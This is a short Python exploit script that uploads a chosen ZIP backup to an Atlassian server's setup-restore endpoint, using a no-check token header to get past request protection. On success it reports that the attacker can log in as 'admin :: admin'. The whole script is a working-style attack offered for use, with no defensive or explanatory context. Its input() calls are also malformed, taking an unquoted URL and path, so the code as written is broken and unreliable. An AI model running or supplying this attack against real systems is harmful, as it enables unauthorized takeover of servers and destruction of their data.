import requests

# Request user input for URL
url = input(http://REDACTED:8090/json/setup-restore.action?synchronous=true)

# Request user input for the location of the .zip file
file_path = input(/path/xmlexport-20231109-060519-1.zip)

# Set the headers
headers = {
    "X-Atlassian-Token": "no-check"
}

# Prepare the data to be sent as form-data
files = {
    "buildIndex": (None, "false"),
    "edit": (None, "Upload and import"),
    "file": ("ZIP_DATA", open(file_path, "rb"), "application/zip")
}

# Send a POST request using the requests library
response = requests.post(url, headers=headers, files=files)

# Check the server response
if response.status_code == 200:
    print("Exploit Success! Login Using 'admin :: admin'")
else:
    print(f"An error occurred with status code: {response.status_code}")
    print(response.text)
